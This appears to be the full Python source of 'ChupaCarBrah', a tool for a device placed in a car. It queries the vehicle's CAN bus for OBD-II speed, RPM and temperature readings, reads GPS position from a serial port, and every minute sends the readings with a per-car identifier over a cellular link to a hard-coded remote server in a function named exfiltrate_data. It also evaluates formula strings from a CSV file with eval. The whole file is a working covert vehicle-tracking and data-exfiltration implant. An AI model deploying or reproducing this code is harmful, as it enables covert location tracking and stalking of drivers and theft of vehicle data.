import sys
import os
import time
import datetime
import json
import csv
import uuid
import requests
import serial
import can
import psutil
from Hologram.CustomCloud import CustomCloud


global server_url
# provide the URL for your ChupaCarBrah server (See https://github.com/blupants/chupacarbrah_server)
server_url = "http://chupacarbrah-env.eba-bdahj3wp.us-east-2.elasticbeanstalk.com/"

global obd2_csv_file
#obd2_csv_file = "obd2_std_PIDs_enabled.csv"
obd2_csv_file = "simple.csv"

global bitrate
bitrate = 500000

global can_interface
can_interface = "can0"

global exfiltrate_interval
exfiltrate_interval = 1  # minutes

global uuid_file
uuid_file = "device_uuid.txt"

global car_uuid
car_uuid = ""

global stop_file
stop_file = "/tmp/stop"

global exported_data_file
exported_data_file = "chupacarbrah.txt"


def hologram_network_connect():
    hologram_network_disconnect()
    time.sleep(2)
    cloud = CustomCloud(None, network='cellular')
    cloud.network.disable_at_sockets_mode()
    res = cloud.network.connect()
    message = ""
    if res:
        message = "PPP session started"
    else:
        message = "Failed to start PPP"

    print(message)


def hologram_network_disconnect():
    print('Checking for existing PPP sessions')
    for proc in psutil.process_iter():

        try:
            pinfo = proc.as_dict(attrs=['pid', 'name'])
        except:
            print("Failed to check for existing PPP sessions")

        if 'pppd' in pinfo['name']:
            print('Found existing PPP session on pid: %s' % pinfo['pid'])
            print('Killing pid %s now' % pinfo['pid'])
            process = psutil.Process(pinfo['pid'])
            process.terminate()
            process.wait()


def _get_car_uuid():
    global uuid_file
    global car_uuid

    if len(car_uuid) > 0:
        return car_uuid

    if os.path.isfile(uuid_file):
        try:
            with open(uuid_file, mode='r') as infile:
                car_uuid = infile.readlines()[0]
        except:
            car_uuid = ""

    if len(car_uuid) <= 0:
        car_uuid = uuid.uuid4().hex
        with open(uuid_file, mode='w') as infile:
            infile.write(car_uuid)
    return car_uuid


def _read_gps_data():
    gps_data = ""
    utf_data = ""
    ser = serial.Serial('/dev/ttyO2', 4800)
    counter = 0
    while utf_data.find("GPRMC") == -1:
        counter += 1
        try:
            ser_data = ser.readline()
            utf_data = ser_data.decode()
        except:
            utf_data = ""
        time.sleep(0.5)
        if counter > 50:
            break
    ser.close()
    if utf_data.find("GPRMC") != -1:
        utf_data = utf_data.replace('\r', '')
        utf_data = utf_data.replace('\n', '')
        gps_data = utf_data
    return gps_data


def exfiltrate_data(data):
    global server_url
    global car_uuid
    print("Sending GPS data...")
    with open(exported_data_file, "a+") as f:
        f.write(json.dumps(data)+"\n\n")
    url = server_url + "/api/v1/cars"
    car_uuid = _get_car_uuid()
    params = dict(
        car_uuid=car_uuid
    )
    headers = {'user-agent': 'chupacarbrah/0.0.1', 'Content-Type': 'application/json'}
    try:
        resp = requests.post(url=url, params=params, headers=headers, timeout=5, data=json.dumps(data))
        code = resp.json()
        if len(code) > 0:
            print("GPS data sent!")
    except:
        print("GPS data not sent!")
        return False
    return True


def run():
    message = "Running ChupaCarBrah..."
    print(message)

    os.system("ip link set {can_interface} up type can bitrate {bitrate}".format(can_interface=can_interface, bitrate=bitrate))
    time.sleep(2)
    os.system("ifconfig {can_interface} up".format(can_interface=can_interface))
    time.sleep(2)

    bus = can.interface.Bus(bustype='socketcan', channel=can_interface, bitrate=bitrate)

    hologram_network_connect()

    start = time.time()

    try:
        os.remove(stop_file)
    except OSError:
        pass

    speed = -1
    rpm = -1
    intake_air_temperature = -1
    while 1:
        with open(obd2_csv_file, mode='r') as infile:
            reader = csv.DictReader(infile)
            if os.path.isfile(stop_file):
                break
            for row in reader:
                service_id = -1
                pid = -1
                description = ""
                formula=""
                enabled = False
                if "Enabled" in row:
                    enabled = bool(int(row["Enabled"]))
                if enabled:
                    if "Mode (hex)" in row:
                        service_id = row["Mode (hex)"]
                        service_int = int(service_id, 16)
                    if "PID (hex)" in row:
                        pid = row["PID (hex)"]
                        pid_int = int(pid, 16)
                    if "Description" in row:
                        description = row["Description"]
                    if "Formula" in row:
                        formula = row["Formula"]

                    if service_int >= 0 and pid_int >= 0:
                        msg = can.Message(arbitration_id=0x7DF, data=[2, service_int, pid_int, 0, 0, 0, 0, 0], is_extended_id=False)

                        try:
                            bus.send(msg)
                            time.sleep(0.5)
                            for i in range(1, 5):
                                time.sleep(0.5)
                                response = bus.recv(timeout=2)
                                if not response:
                                    message = "No response from CAN bus. Service: {} PID: {} - {}".format(service_id.zfill(2), pid.zfill(2), description)
                                    print(message)
                                    break
                                if response:
                                    received_pid = list(response.data)[2]
                                    A = list(response.data)[3]
                                    B = list(response.data)[4]
                                    C = list(response.data)[5]
                                    D = list(response.data)[6]
                                    if service_id == "1":
                                        if len(formula) > 0:
                                            try:
                                                result = eval(formula)
                                                message = "{description}: {result}".format(description=description, result=result)
                                                print(message)
                                                if pid_int == int(received_pid):
                                                    if pid_int == int("0C", 16):
                                                        rpm = result
                                                    if pid_int == int("0D", 16):
                                                        speed = result
                                                    if pid_int == int("0F", 16):
                                                        intake_air_temperature = result
                                            except:
                                                print("Unable to parse formula: {}.".format(formula))
                                    if service_id == "9":
                                        result = ""
                                        try:
                                            for c in list(response.data)[-3:]:
                                                result += chr(c)
                                            message = "{description}: {result}".format(description=description, result=result)
                                            print(message)
                                        except:
                                            print("Unable to parse response: {}.".format(response.data))
                        except can.CanError:
                            print("CAN error")

            end = time.time()
            hours, rem = divmod(end - start, 3600)
            minutes, seconds = divmod(rem, 60)
            if minutes >= exfiltrate_interval:
                car_uuid = _get_car_uuid()
                timestamp = str(datetime.datetime.now())
                gps_data = _read_gps_data()
                log = {"timestamp": timestamp, "GPS": gps_data, "speed": speed, "rpm": rpm, "temperature": intake_air_temperature}
                data = {"car_uuid": car_uuid, "log": log}
                if exfiltrate_data(data):
                    start = time.time()


    hologram_network_disconnect()
    bus.shutdown()
    os.system("ifconfig {can_interface} down".format(can_interface=can_interface))
    try:
        os.remove(stop_file)
    except OSError:
        pass
    message = "ChupaCarBrah exited successfully."
    print(message)
    sys.exit(0)


if __name__ == '__main__':
    run()
